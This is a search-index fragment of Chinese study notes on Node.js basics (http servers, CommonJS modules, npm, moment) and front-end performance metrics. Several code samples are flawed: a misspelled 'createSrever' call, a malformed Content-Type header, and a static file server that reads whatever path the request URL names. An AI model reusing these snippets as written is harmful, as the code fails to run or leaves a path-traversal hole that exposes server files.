\u662f\u4e92\u8054\u7f51\u4e2d\u6bcf\u53f0\u8ba1\u7b97\u673a\u7684\u552f\u4e00\u5730\u5740\uff08\u7c7b\u4f3c\u4e8e\u624b\u673a\u53f7\uff09\uff0c\u53ea\u6709\u77e5\u9053\u5bf9\u65b9 IP \u7684\u60c5\u51b5\u4e0b\uff0c\u624d\u80fd\u6570\u636e\u901a\u4fe1\u3002\u4e92\u8054\u7f51\u4e2d\u7684\u6bcf\u53f0 web \u670d\u52a1\u5668\u90fd\u6709 IP \u5730\u5740\uff0c\u53ef\u4ee5\u4f7f\u7528 ping \u67e5\u8be2\u5230\u67d0\u4e2a\u670d\u52a1\u5668\u7684\u5730\u5740\u3002\u672c\u673a\u7684 IP \u5730\u5740\u662f 127.0.0.1\u3002</p> <p>\u57df\u540d\uff1aIP \u662f\u4e00\u4e2a\u5f88\u957f\u7684\u6570\u5b57\uff0c\u4e0d\u4fbf\u4e8e\u8bb0\u5fc6\u3002\u4e3a\u4e86\u65b9\u4fbf\u8bb0\u5fc6\uff0c\u6240\u4ee5\u4f7f\u7528\u4e00\u4e2a\u82f1\u6587\u5b57\u7b26\u4e32\uff08\u5c31\u662f\u57df\u540d\uff09\u6765\u8868\u793a\u771f\u5b9e\u7684IP\u3002\u5982\u679c\u5728\u6d4f\u89c8\u5668\u4e2d\u8f93\u5165\u57df\u540d\uff08baidu.com\uff09\uff0c\u9996\u5148\u5230\u57df\u540d\u670d\u52a1\u5668\uff08DNS\uff09\u4e2d\u67e5\u627eIP\uff0c\u7136\u540e\u8bbf\u95ee\u8fd9\u4e2aIP\u3002\u57df\u540d\u670d\u52a1\u5668\u5b9e\u9645\u4e0a\u5c31\u662f\u4e00\u4e2a\u57df\u540d\u548cIP\u7684\u952e\u503c\u5bf9\u67e5\u8be2\u670d\u52a1\u5668\u3002\u5b9e\u9645\u6d4b\u8bd5\uff0cping \u4e0d\u540c\u5b50\u57df\u540d IP \u662f\u4e0d\u540c\u7684\u7ed3\u679c\uff08baidu.com, fanyi.baidu.com, map.baidu.com\uff09\u3002\u5355\u72ec\u4f7f\u7528 IP \u5730\u5740\u4e5f\u80fd\u5de5\u4f5c\uff0c\u57df\u540d\u8ba9\u8bbf\u95ee\u66f4\u4fbf\u6377\u3002127.0.0.1 \u7684\u57df\u540d\u5c31\u662f localhost\u3002</p> <p>\u7aef\u53e3\u53f7\uff1a\u4e00\u4e2a\u670d\u52a1\u5668\u53ef\u80fd\u540c\u65f6\u63d0\u4f9b\u591a\u4e2a\u670d\u52a1\u3002\u4e3a\u4e86\u4e0d\u51b2\u7a81\uff0c\u6bcf\u4e00\u4e2a\u670d\u52a1\u90fd\u5bf9\u5e94\u552f\u4e00\u7684\u4e00\u4e2a\u7aef\u53e3\u53f7\u3002\u5ba2\u6237\u7aef\u53d1\u51fa\u7684\u7f51\u7edc\u8bf7\u6c42\uff0c\u901a\u8fc7\u7aef\u53e3\u53f7\uff0c\u53ef\u4ee5\u88ab\u4e0d\u540c\u7684 web \u670d\u52a1\u8fdb\u884c\u5904\u7406\u3002\u4e00\u4e2a\u7aef\u53e3\u53f7\u4e0d\u80fd\u88ab\u591a\u4e2a\u670d\u52a1\u5360\u7528\uff0c\u5982\u679c\u4e00\u4e2a\u7aef\u53e3\u5360\u7528\u4e86\uff0c\u90a3\u4e48\u65b0\u7684web\u670d\u52a1\u4f1a\u63d0\u793a\u53e6\u5916\u4e00\u4e2a\u7aef\u53e3\u5f00\u542f\u3002\u9ed8\u8ba4\u7aef\u53e3\u662f80\uff0c80 \u7aef\u53e3\u901a\u5e38\u53ef\u4ee5\u7701\u7565\u3002</p>"},{"location":"ebook-heima-nodejs/02/#03http-web","title":"03.http-\u521b\u5efa\u6700\u57fa\u672c\u7684web\u670d\u52a1\u5668","text":"<p>\u521b\u5efa\u6b65\u9aa4\uff1a\u5bfc\u5165http\u6a21\u5757\u2014\u2014\u521b\u5efahttp\u5bf9\u8c61\u5b9e\u4f8b\u2014\u2014\u7ed1\u5b9a request \u4e8b\u4ef6\uff0c\u76d1\u542c\u5ba2\u6237\u7aef\u8bf7\u6c42\u2014\u2014\u542f\u52a8</p> <pre><code>const http = require('http');\nconst server = http.createSrever();\n\nserver.on('request', function(req, res) {\n  console.log('request event');\n\n  // request \u662f\u5ba2\u6237\u7aef\u53d1\u51fa\u7684\u8bf7\u6c42\u5bf9\u8c61\uff0c\u53ef\u4ee5\u67e5\u770b\u8bf7\u6c42\u7684URL\u548c\u65b9\u6cd5\n  const { url, method } = req;\n  console.log(url, method);\n\n  // response \u662f\u670d\u52a1\u5668\u76f8\u5173\u7684\u5bf9\u8c61\uff0c\u53ef\u4ee5\u7528\u4e8e\u8fd4\u56de\u6570\u636e\n  res.end(method);\n\n  // \u5982\u679c\u76f4\u63a5\u53d1\u9001\u4e2d\u6587\u5185\u5bb9\uff0c\u4f1a\u663e\u793a\u4e71\u7801\uff0c\u5e94\u8be5\u624b\u52a8\u8bbe\u7f6e\u8fd4\u56de\u7684\u7f16\u7801\u7c7b\u578b\n  res.setHeader('Content-Type', 'text/html: charset=utf-8');\n});\n\nserver.listen(80, () =&gt; {\n  console.log('server is running at localhost:80')\n});\n</code></pre>"},{"location":"ebook-heima-nodejs/02/#04http-urlhtml","title":"04.http-\u6839\u636e\u4e0d\u540c\u7684url\u54cd\u5e94\u4e0d\u540c\u7684html\u5185\u5bb9","text":"<p>\u5b9e\u9645\u4e0a\u5c31\u662f urls \u6a21\u5757\uff0c\u6839\u636e\u4e0d\u540c\u7684 URL \u8bbe\u7f6e\u8fd4\u56de\u503c\u3002</p> <p>\u5b9e\u73b0\u601d\u8def\uff08\u5148\u4e00\u5b9a\u628a\u601d\u8def\u7406\u6e05\u695a\uff09\u2014\u2014\u8fd9\u4e2a\u6559\u7a0b\u6700\u5927\u7684\u6536\u83b7\u662f\u5982\u4f55\u5206\u6790\u95ee\u9898</p> <ol> <li>\u83b7\u53d6\u8bf7\u6c42\u7684URL</li> <li>\u8bbe\u7f6e\u9ed8\u8ba4\u7684\u76f8\u5e94\u5185\u5bb9\u662f404</li> <li>\u8bbe\u7f6e\u8bf7\u6c42\u9996\u9875\u5185\u5bb9</li> <li>\u8bbe\u7f6e\u5173\u4e8e\u9875\u9762\u5185\u5bb9</li> <li>\u5904\u7406\u4e2d\u6587\u4e71\u7801</li> <li>\u8fd4\u56de\u5ba2\u6237\u7aef</li> </ol> <pre><code>const http = require('http');\nconst server = http.createServer();\n\nserver.on('request', function(req, res) {\n  const url = req.url;\n  let content = '404 not fount';\n  if (url === '/' || url === '/index.html') {\n    content = 'main page';\n  }\n  else if (url === '/about.html') {\n    content = 'about page';\n  }\n  res.setHeader('Content-Type', 'text/html: charset=utf-8');\n  res.end(content);\n});\n\nserver.listen(80, () =&gt; {\n  console.log('server is running at 80');\n})\n</code></pre>"},{"location":"ebook-heima-nodejs/02/#05http-web","title":"05.http-\u65f6\u949fweb\u670d\u52a1\u5668\u6848\u4f8b","text":"<p>web\u670d\u52a1\u5668\u5b9e\u73b0\u601d\u8def</p> <ul> <li>\u6d4f\u89c8\u5668\u8f93\u5165 URL\uff0c\u53d1\u51fa\u8bf7\u6c42</li> <li>web \u670d\u52a1\u5668\u6839\u636e URL \u5339\u914d\u9700\u8981\u627e\u5230\u7684\u8d44\u6e90</li> <li>\u67e5\u8be2\u6570\u636e\u5e93\uff0c\u83b7\u53d6\u8d44\u6e90\uff08\u8fd9\u91cc\u4f7f\u7528fs\u6a21\u5757\u76f4\u63a5\u8bfb\u53d6\u786c\u76d8\u7684\u6570\u636e\uff0c\u6a21\u62df\u6570\u636e\u5e93\uff09</li> <li>\u8fd4\u56de\u7ed9\u524d\u7aef\u9875\u9762\uff0c\u5c55\u793a</li> </ul> <pre><code>const http = require('http');\nconst fs = require('fs');\nconst path = require('path');\n\nconst server = http.createServer();\n\nserver.on('request', (req, res) =&gt; {\n  let url = req.url;\n  // handle default path /\n  if (url === '/') {\n    url = './clock/index.html';\n  }\n  const fpath = path.join(__dirname, url);\n  fs.readFile(fpath, 'utf-8', (err, dataStr) =&gt; {\n    if (err) {\n      return res.end('404 not found');\n    } else {\n      res.end(dataStr);\n    }\n  });\n});\n\nserver.listen(80, () =&gt; {\n  console.log('server running at http://127.0.0.1:80');\n});\n</code></pre>"},{"location":"ebook-heima-nodejs/02/#06-","title":"06.\u6a21\u5757\u5316-\u6a21\u5757\u5316\u7684\u6982\u5ff5","text":"<ul> <li>\u4e86\u89e3\u6a21\u5757\u5316\u7684\u597d\u5904\uff0cCommonJS \u662f\u4ec0\u4e48\uff0c\u6a21\u5757\u7684\u4e09\u5927\u5206\u7c7b\uff0c\u6a21\u5757\u52a0\u8f7d\u673a\u5236</li> <li>\u719f\u7ec3\u4f7f\u7528 npm \u4e0d\u540c\u7248\u672c\u53f7\u7684\u539f\u7406</li> </ul> <p>\u6a21\u5757\u5316\uff1a\u6309\u7167\u56fa\u5b9a\u7684\u89c4\u5219\uff0c\u628a\u5927\u6587\u4ef6\u62c6\u5206\u6210\u72ec\u7acb\u4e14\u4e92\u76f8\u4f9d\u8d56\u7684\u591a\u4e2a\u5c0f\u6a21\u5757\u3002\u597d\u5904\uff1a\u4ee3\u7801\u590d\u7528\u6027\uff0c\u4ee3\u7801\u53ef\u7ef4\u62a4\u6027\uff0c\u6309\u9700\u52a0\u8f7d\u6a21\u5757\u3002</p> <p>\u6a21\u5757\u5316\u89c4\u8303\uff1a\u6309\u7167\u7edf\u4e00\u7684\u5bfc\u5165\u5bfc\u51fa\u8bed\u53e5\uff0c\u8fd9\u6837\u5168\u90e8\u7684\u6a21\u5757\u63a5\u53e3\u5c31\u4e00\u81f4\u4e86\u3002</p>"},{"location":"ebook-heima-nodejs/02/#07-require","title":"07.\u6a21\u5757\u5316-\u6a21\u5757\u7684\u5206\u7c7b&amp;require\u7684\u4f7f\u7528","text":"<p>\u6a21\u5757\u7684\u5206\u7c7b\uff1a\u5185\u7f6e\u6a21\u5757 fs\uff1b\u81ea\u5b9a\u4e49\u6a21\u5757\uff1b\u7b2c\u4e09\u65b9\u6a21\u5757 egg</p> <p>\u52a0\u8f7d\u6a21\u5757\u4f7f\u7528 require</p> <pre><code>const fs = require('fs');\nconst cumtom = require('./custom.js');\nconst moment = require('moment');\n</code></pre> <p>\u4f7f\u7528 require \u65b9\u6cd5\u52a0\u8f7d\u6a21\u5757\u65f6\uff0c\u4f1a\u6267\u884c\u88ab\u52a0\u8f7d\u6a21\u5757\u4e2d\u7684\u4ee3\u7801\uff1b</p>"},{"location":"ebook-heima-nodejs/02/#08-module","title":"08.\u6a21\u5757\u5316-\u6a21\u5757\u4f5c\u7528\u57df\u548cmodule\u5bf9\u8c61","text":"<p>\u6a21\u5757\u4f5c\u7528\u57df\uff1a\u7c7b\u4f3c\u51fd\u6570\u4f5c\u7528\u57df\uff0c\u6a21\u5757\u5916\u90e8\u65e0\u6cd5\u8bbf\u95ee\u6a21\u5757\u5185\u7f6e\u7684\u53d8\u91cf\u548c\u51fd\u6570\u3002</p> <p>\u6a21\u5757\u4f5c\u7528\u57df\u7684\u597d\u5904\uff1a\u907f\u514d\u5168\u5c40\u53d8\u91cf\u6c61\u67d3\u7684\u95ee\u9898</p>"},{"location":"ebook-heima-nodejs/02/#09moduleexports","title":"09.\u6a21\u5757\u5316module.exports\u5bf9\u8c61\u7684\u4f7f\u7528","text":"<p>\u6bcf\u4e00\u4e2a\u6a21\u5757\u5185\u90e8\uff0c\u90fd\u6709\u4e00\u4e2a module \u5bf9\u8c61\uff0c\u5b58\u50a8\u4e86\u548c\u5f53\u524d\u6a21\u5757\u6709\u5173\u7684\u5c5e\u6027\u548c\u65b9\u6cd5</p> <pre><code>Module = {\n  id: '',\n  path: '/test/code',\n  fileName: '/test/code/index.js',\n  exports: {}\n};\n// \u8fd8\u6709\u5176\u4ed6\u5c5e\u6027\u548c\u65b9\u6cd5\n</code></pre> <p>\u91cd\u8981\u7684\u662f exports \u5bf9\u8c61\uff0c\u63d0\u4f9b\u4e86\u5bf9\u5916\u7684\u8f93\u51fa</p>"},{"location":"ebook-heima-nodejs/02/#10-exports","title":"10.\u6a21\u5757\u5316-exports\u5bf9\u8c61","text":"<pre><code>module.exports.name = 'hello';\n\nmodule.exports.sayHi = function() {\n  console.log('hi');\n}\n</code></pre> <pre><code>const m = require('./hello.js');\nconsole.log(m);\n</code></pre> <p>\u5b9e\u9645\u5bfc\u51fa\u7684\u7ed3\u679c\uff0c\u6c38\u8fdc\u4ee5 module.exports \u6307\u5411\u7684\u5bf9\u8c61\u4e3a\u51c6\u3002</p> <p>nodeJS \u4e2d\uff0cexports \u548c module.exports \u9ed8\u8ba4\u6307\u5411\u540c\u4e00\u4e2a\u5bf9\u8c61\u3002\u5982\u679c\u624b\u52a8\u66f4\u6539\u4e86\u6307\u5411\uff0c\u6700\u540e\u8fd8\u662f\u6307\u5411 module.exports \u6307\u5411\u7684\u5bf9\u8c61\u3002</p> <pre><code>exports === module.exports\n</code></pre>"},{"location":"ebook-heima-nodejs/02/#11-exportsmoduleexports","title":"11.\u6a21\u5757\u5316-exports\u548cmodule.exports\u7684\u4f7f\u7528\u8bef\u533a","text":"<p>\u901a\u5e38\u4e0d\u8981\u6df7\u5408\u4f7f\u7528 exports \u548c module.exports\u3002\u76f4\u63a5\u4f7f\u7528 exports \u5373\u53ef\u3002</p> <p>\u901a\u5e38\u4e0d\u8981\u66f4\u6539 module.exports \u7684\u6307\u5411\uff0c\u4ee5\u53ca module \u7684\u5176\u4ed6\u5c5e\u6027\u65b9\u6cd5\u7b49\u3002</p>"},{"location":"ebook-heima-nodejs/02/#12-commonjs","title":"12.\u6a21\u5757\u5316-CommonJS\u6a21\u5757\u5316\u89c4\u8303","text":"<p>commonJS \u89c4\u5b9a\u4e86\u6a21\u5757\u7684\u7279\u6027\u548c\u5404\u6a21\u5757\u4e4b\u95f4\u7684\u4e92\u76f8\u4f9d\u8d56\u89c4\u8303\u3002</p> <ol> <li>\u6bcf\u4e2a\u6a21\u5757\u5185\u90e8\uff0cmodule \u53d8\u91cf\u8868\u793a\u5f53\u524d\u6a21\u5757</li> <li>module.exports \u662f\u5bf9\u5916\u7684\u63a5\u53e3</li> <li>require \u7528\u4e8e\u52a0\u8f7d\u6a21\u5757</li> </ol>"},{"location":"ebook-heima-nodejs/02/#13npm-","title":"13.\u5305\u4e0enpm-\u5305\u7684\u6982\u5ff5","text":"<p>\u5305 === \u7b2c\u4e09\u65b9\u6a21\u5757</p> <p>nodeJS \u5185\u7f6e\u6a21\u5757\u662f\u5b98\u65b9\u5f00\u53d1\u7684\uff0c\u7b2c\u4e09\u65b9\u6a21\u5757\u662f\u7b2c\u4e09\u65b9\u7684\u4e2a\u4eba\u6216\u8005\u56e2\u961f\u5f00\u53d1\u51fa\u6765\u7684\uff0c\u5927\u90e8\u5206\u662f\u514d\u8d39\u5f00\u6e90\u7684\u3002</p> <p>\u4e3a\u4ec0\u4e48\u6709\u7b2c\u4e09\u65b9\u6a21\u5757\uff1a\u56e0\u4e3a\u6709\u4e9b\u5185\u7f6e\u6a21\u5757\u4f7f\u7528\u4e0d\u65b9\u4fbf\uff0c\u90a3\u4e48\u5c31\u57fa\u4e8e\u5185\u7f6e\u6a21\u5757\u5c01\u88c5\u6210\u5305\uff0c\u53ef\u4ee5\u63d0\u9ad8\u5f00\u53d1\u6548\u7387\u3002</p> <p>NPM\u2014\u2014node package manager \u5305\u7ba1\u7406\u5de5\u5177\uff0c\u4f7f\u7528\u8fd9\u4e2a\u5de5\u5177\u53bb\u5b89\u88c5\u7ba1\u7406\u5305</p>"},{"location":"ebook-heima-nodejs/02/#14npm-","title":"14.\u5305\u4e0enpm-\u683c\u5f0f\u5316\u65f6\u95f4\u7684\u4e24\u79cd\u505a\u6cd5","text":"<p>\u901a\u8fc7\u683c\u5f0f\u5316\u65f6\u95f4\u7684\u6848\u4f8b\uff0c\u8bf4\u660e\u539f\u751f\u5b9e\u73b0\u548c moment \u5b9e\u73b0\u4e24\u79cd\u65b9\u6cd5</p>"},{"location":"ebook-heima-nodejs/02/#_2","title":"\u539f\u751f\u65b9\u6848","text":"<ul> <li>\u65b0\u5efa\u683c\u5f0f\u5316\u65f6\u95f4\u7684\u65b9\u6cd5</li> <li>\u65b0\u5efa\u8865\u96f6\u51fd\u6570</li> <li>\u81ea\u5b9a\u4e49\u6a21\u5757\u5c01\u88c5\u5bfc\u51fa</li> <li>\u8c03\u7528\u683c\u5f0f\u5316\u65f6\u95f4\u7684\u51fd\u6570</li> </ul> <p>\u4ee3\u7801\u5b9e\u73b0</p> <pre><code>function dateFormat(dateStr) {\n  const dt = new Date(dateStr);\n\n  const y = dt.getFullYear();\n  const m = padZero(dt.getMonth() + 1);\n  const d = padZero(dt.getDate());\n\n  const hh = padZero(dt.getHours());\n  const mm = padZero(dt.getMinutes());\n  const ss = padZero(dt.getSeconds());\n\n  return `${y}-${m}-${d} ${hh}:${mm}:${ss}`;\n}\n\nfunction padZero(n) {\n  return n &gt; 9 ? n : `0${n}`;\n}\n\nmodule.exports = { dateFormat };\n</code></pre> <pre><code>const TimeUtils = require('./time-utils');\nconst dt = new Date();\nconst newDt = TimeUtils.dateFormat(dt);\n</code></pre> <p>\u8fd9\u79cd\u5b9e\u73b0\u6bd4\u8f83\u9ebb\u70e6\uff0c\u800c\u4e14\u9700\u8981\u81ea\u5b9a\u4e49\u51fd\u6570\u5904\u7406\u683c\u5f0f\u548c\u6708\u4efd\u52a01</p>"},{"location":"ebook-heima-nodejs/02/#moment","title":"moment \u65b9\u6848","text":"<ul> <li>\u5b89\u88c5 moment\uff0c\u5f15\u5165 mement</li> <li>\u53c2\u7167\u5b98\u7f51 API \u683c\u5f0f\u5316\u9700\u8981\u7684\u65f6\u95f4</li> </ul> <p>\u6ce8\u610f\uff1aHH \u548c hh \u662f24\u5c0f\u65f6\u548c12\u5c0f\u65f6\uff0c\u5b9e\u9645\u9879\u76ee\u4e2d\u8981\u7edf\u4e00</p> <pre><code>const moment = require('moment');\nconst dt = moment().format('YYYY-MM-DD HH:mm:ss');\n</code></pre>"},{"location":"ebook-heima-nodejs/02/#15npm-npm","title":"15.\u5305\u4e0enpm-\u4f7f\u7528npm\u7684\u5176\u5b83\u6ce8\u610f\u70b9","text":"<p>\u6587\u4ef6\u76ee\u5f55\uff1a\u5b89\u88c5\u5305\u540e\uff0c\u9879\u76ee\u4e2d package-lock.json \u548c node_modules \u4f1a\u591a\u51fa\u6587\u4ef6\u3002Package-lock.json \u4e2d\u8bb0\u5f55\u4e86\u6bcf\u4e00\u4e2a\u5305\u7684\u4e0b\u8f7d\u4fe1\u606f\u548c\u4f9d\u8d56\u6811\uff0c\u4e0d\u9700\u8981\u624b\u52a8\u66f4\u6539\uff0c\u5b89\u88c5\u65f6\u4f1a\u81ea\u52a8\u66f4\u65b0\u3002</p> <p>\u5305\u7248\u672c\u53f7\u8bf4\u660e\uff1a\u4e09\u4f4d\u6570\u5b57</p> <ul> <li>\u7b2c\u4e00\u4e2a\u662f\u5927\u7248\u672c\uff0c\u8868\u793a\u548c\u4e0a\u4e00\u4e2a\u5927\u7248\u672c\u4ece\u5e95\u5c42\u4e0a\u66f4\u65b0</li> <li>\u7b2c\u4e8c\u4e2a\u662f\u529f\u80fd\u7248\u672c\uff0c\u8868\u793a\u65b0\u52a0\u5165\u6216\u8005\u4fee\u6539\u67d0\u4e9b\u4e3b\u8981\u529f\u80fd</li> <li>\u7b2c\u4e09\u4e2a\u662f bug \u4fee\u590d\u7248\u672c\uff0c\u6216\u8005\u6dfb\u52a0\u5c0f\u7684\u529f\u80fd\u7b49</li> </ul> <p>\u5b9e\u9645\u53d1\u5305\u65f6\uff0c\u540e\u4e24\u4f4d\u7684\u533a\u5206\u6ca1\u6709\u90a3\u4e48\u660e\u663e\u3002\u53ea\u8981\u524d\u9762\u7684\u7248\u672c\u63d0\u5347\u4e86\uff0c\u540e\u9762\u7684\u7248\u672c\u53f7\u9700\u8981\u5f52\u96f6\u3002</p>"},{"location":"ebook-heima-nodejs/03/","title":"03","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 786  \u9605\u8bfb2\u5206\u949f</p>"},{"location":"ebook-heima-nodejs/03/#_1","title":"\u7b2c\u4e09\u5929","text":"<p>P29</p> <p>01.\u5305\u7ba1\u7406\u914d\u7f6e\u6587\u4ef6</p> <p>package.json dependencies, devdependencies \u4f9d\u8d56\u7684\u533a\u522b</p> <p>P30</p> <p>02.\u89e3\u51b3\u4e0b\u5305\u6162\u7684\u95ee\u9898</p> <p>14:40</p> <p>P31</p> <p>03.\u5305\u7684\u5206\u7c7b&amp;\u89c4\u8303\u7684\u5305\u7ed3\u6784</p> <p>12:17</p> <p>P32</p> <p>04.\u53d1\u5e03\u5305-\u521d\u59cb\u5316\u57fa\u7840\u7684\u5305\u7ed3\u6784</p> <p>13:33</p> <p>P33</p> <p>05.\u53d1\u5e03\u5305-\u683c\u5f0f\u5316\u65f6\u95f4&amp;main\u5c5e\u6027</p> <p>09:06</p> <p>P34</p> <p>06.\u53d1\u5e03\u5305-\u8f6c\u4e49&amp;\u8fd8\u539fHTML\u7684\u65b9\u6cd5</p> <p>11:21</p> <p>P35</p> <p>07.\u53d1\u5e03\u5305-\u6a21\u5757\u5316\u62c6\u5206&amp;\u7f16\u5199\u5305\u7684\u4f7f\u7528\u8bf4\u660e\u6587\u6863</p> <p>14:03</p> <p>P36</p> <p>08.\u53d1\u5e03\u5305-\u628a\u5305\u53d1\u5e03\u5230npm</p> <p>14:27</p> <p>P37</p> <p>09.\u6a21\u5757\u7684\u52a0\u8f7d\u673a\u5236</p> <p>18:57</p> <p>P38</p> <p>10.express-\u8ba4\u8bc6express\u5e76\u521b\u5efa\u57fa\u672c\u989dweb\u670d\u52a1\u5668</p> <p>09:56</p> <p>P39</p> <p>11.express-\u76d1\u542cGET\u548cPOST\u8bf7\u6c42&amp;\u5904\u7406\u53c2\u6570</p> <p>20:14</p> <p>P40</p> <p>12.express-\u9759\u6001\u8d44\u6e90\u5904\u7406</p> <p>15:47</p> <p>P41</p> <p>13.express-\u5b89\u88c5\u5e76\u4f7f\u7528nodemon</p> <p>05:27</p>"},{"location":"ebook-kaikeba-frontend/01%20%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/","title":"2021-08-17","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 9178  \u9605\u8bfb19\u5206\u949f</p>"},{"location":"ebook-kaikeba-frontend/01%20%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/#12-2","title":"12-2 \u524d\u7aef\u6027\u80fd\u4f18\u5316","text":"<p>\u8fd9\u8282\u8bfe\u8bb2\u7684\u6bd4\u8f83\u7c97\uff0c\u6ca1\u6709\u5177\u4f53\u5c06\u4f18\u5316\u975e\u5185\u5bb9\uff0c\u5177\u4f53\u60c5\u51b5\u770b\u7f51\u6613\u7684\u7b14\u8bb0\u3002</p>"},{"location":"ebook-kaikeba-frontend/01%20%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/#_1","title":"\u5206\u6790\u89d2\u5ea6\uff1a\u4ece\u9762\u8bd5\u9898\u5165\u624b","text":"<p>\u6d4f\u89c8\u5668\u8f93\u5165 URL \u5230\u754c\u9762\u663e\u793a\u7684\u8fc7\u7a0b\u662f\u4ec0\u4e48\uff1f\u5177\u4f53\u600e\u4e48\u4f18\u5316\uff1f</p> <p>\u6d4f\u89c8\u5668\u8f93\u5165 URL\uff0c\u901a\u8fc7DNS\u57df\u540d\u89e3\u6790\uff0c\u8f6c\u6362\u6210IP\u5730\u5740\u3002\u8bbf\u95ee\u8fd9\u4e2aIP\u5730\u5740\uff0c\u670d\u52a1\u5668\u51c6\u5907HTML\u8fd4\u56de\u6d4f\u89c8\u5668\u3002\u6d4f\u89c8\u5668\u89e3\u6790HTML\uff0c\u540c\u65f6\u8bf7\u6c42HTML\u5185\u90e8\u7684CSS\u548c\u5a92\u4f53\u6587\u4ef6\u7b49\uff0c\u89e3\u6790HTML\u751f\u6210 DOM \u6811\uff0cCSS \u8fd4\u56de\u540e\uff0c\u751f\u6210\u6e32\u67d3\u6811\uff0c\u6d4f\u89c8\u5668\u663e\u793a\u7f51\u9875\u3002</p> <p>\u5728\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\u5b9e\u73b0\u4f18\u5316\uff1a</p> <p>\u7f51\u7edc\u4f18\u5316\uff1aDNS\u3001CDN\uff08\u5168\u7403\u4e0d\u540c\u4f4d\u7f6e\u90e8\u7f72\u670d\u52a1\u5668\uff0c\u7528\u6237\u9009\u62e9\u6700\u8fd1\u7684\u4f4d\u7f6e\u63a5\u6536\u6587\u4ef6\uff09\u5c11\u52a0\u8f7d\u6587\u4ef6\uff0c\u51cf\u5c11\u8bf7\u6c42\u6570\u91cf\uff08webpack\u538b\u7f29JS\u548cCSS\u6587\u4ef6\uff09\uff0cCSS\u56fe\u6807\u4f7f\u7528\u96ea\u78a7\u56fe\uff1b</p> <p>\u591a\u5a92\u4f53\u4f18\u5316\uff1a\u56fe\u7247\u4f18\u5316\u3001Gzip\u538b\u7f29\u7ec4\u4ef6\uff08\u538b\u7f29\u8bf7\u6c42\u5934\u7b49\uff0c\u51cf\u5c11HTTP\u7684\u54cd\u5e94\u5934\u7684\u5927\u5c0f\uff0c\u51cf\u5c11\u54cd\u5e94\u65f6\u95f4\uff09\u538b\u7f29\u56fe\u7247\u5927\u5c0f\uff08\u52a0\u5feb\u4f20\u8f93\u901f\u5ea6\uff0c\u4f7f\u7528\u5c0f\u683c\u5f0fjpg\u6216\u8005webp\u6587\u4ef6\uff09\uff1b\u61d2\u52a0\u8f7d\u56fe\u7247\uff1b</p> <p>JS\u4f18\u5316\uff1a\u4f7f\u7528SSR\u4e2d\u95f4\u5c42\uff1b\u9996\u5c4f\u4f18\u5316\uff1b\u4f18\u5316cookie\uff1b\uff1b\u56de\u6d41\u91cd\u7ed8\uff1b\u9632\u6296\u8282\u6d41\u3002\u51cf\u5c11DOM\u6570\u91cf\uff1aDOM\u6570\u91cf\u8d8a\u5c11\uff0c\u90a3\u4e48\u9700\u8981\u4e0b\u8f7d\u7684\u5185\u5bb9\u548c\u9700\u8981\u5904\u7406\u7684\u4e8b\u4ef6\u5c31\u8d8a\u5c11\u3002</p> <p>\u79fb\u52a8\u7aef\uff1a\u5217\u8868\u90e8\u5206\u6e32\u67d3\u3002\u79fb\u52a8\u7aef\u548cPC\u7aef\u8bf7\u6c42\u4e0d\u540c\u7684\u8d44\u6e90</p>"},{"location":"ebook-kaikeba-frontend/01%20%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/#_2","title":"\u6027\u80fd\u6307\u6807","text":"<p>Performance API</p> <p>window.performance.timing \u83b7\u53d6\u65f6\u95f4\u5bf9\u8c61\uff0c\u7136\u540e\u5224\u65ad\u4e0d\u540c\u9636\u6bb5\u8017\u65f6</p> <p>TCP \u94fe\u63a5\u8017\u65f6\uff1aconnectEnd - connectStart</p> <p>DNS \u67e5\u8be2\u8017\u65f6\uff1adomainLookupEnd - domainLookupStart</p> <p>TTFB\uff08\u83b7\u53d6\u9996\u5b57\u8282\u8017\u65f6\uff09\uff1aresponseStart - navigationStart</p> <p>Dom Ready \u8017\u65f6: domContentLoadedEventStart - navigationStart</p> <p>DOM \u8d44\u6e90\u4e0b\u8f7d\uff1aresponseEnd - responseStart</p> <p>\u4e3b\u8981\u662f\u540e\u4e24\u9879\u8017\u65f6\u3002</p> <p>\u6216\u8005\u76f4\u63a5\u6253\u5f00\u6d4f\u89c8\u5668Performance\u53ef\u89c6\u5316\u663e\u793a\u754c\u9762\u52a0\u8f7d\u8fc7\u7a0b\uff0c\u53ef\u4ee5\u5206\u6790\u5177\u4f53\u67d0\u77ed\u65f6\u95f4\u8017\u65f6\u7684\u539f\u56e0\u3002</p> <p>FPS\uff1a\u8861\u91cf\u52a8\u753b\u6d41\u7545\u5ea6\uff08\u5e27\u7387\uff09\uff0c\u8d8a\u5927\u8d8a\u597d</p> <p>CPU\uff1a\u5c55\u73b0CPU\u7684\u4f7f\u7528\u60c5\u51b5\uff08\u7a7a\u95f2\u6027\u80fd\u3001\u811a\u672c\u52a0\u8f7d\u65f6\u95f4\u7b49\uff09</p> <p>NET\uff1a\u8bf7\u6c42\u82b1\u8d39\u5177\u4f53\u65f6\u95f4</p> <p>HEAP\uff1a\u8bf7\u6c42\u8fc7\u7a0b\u4e2d\u5806\u5185\u5b58\u4f7f\u7528\u60c5\u51b5</p> <p>FP(first paint)\uff1a\u67d0\u4e00\u5143\u7d20\u9996\u6b21\u6e32\u67d3\u65f6\u95f4</p> <p>FCP\uff08first contentful paint\uff09:\u767d\u5c4f\u65f6\u95f4\uff08\u754c\u9762\u9996\u6b21\u6e32\u67d3\u6587\u672c\u56fe\u50cf\u7b49\u975e\u767d\u8272\u753b\u5e03\uff09</p> <p>TTI\uff08time to interactive\uff09\u53ef\u4ea4\u4e92\u65f6\u95f4\uff08DOM\u6811\u6784\u5efa\u540e\uff0c\u7528\u6237\u5c31\u53ef\u4ee5\u6b63\u5e38\u4ea4\u4e92\uff0c\u8fd9\u4e2a\u662f\u91cd\u8981\u7684\u7528\u6237\u4f53\u9a8c\u6307\u6807\uff09\u3002</p> <p>\u53ef\u4ee5\u672c\u5730\u5b89\u88c5 Lighthouse 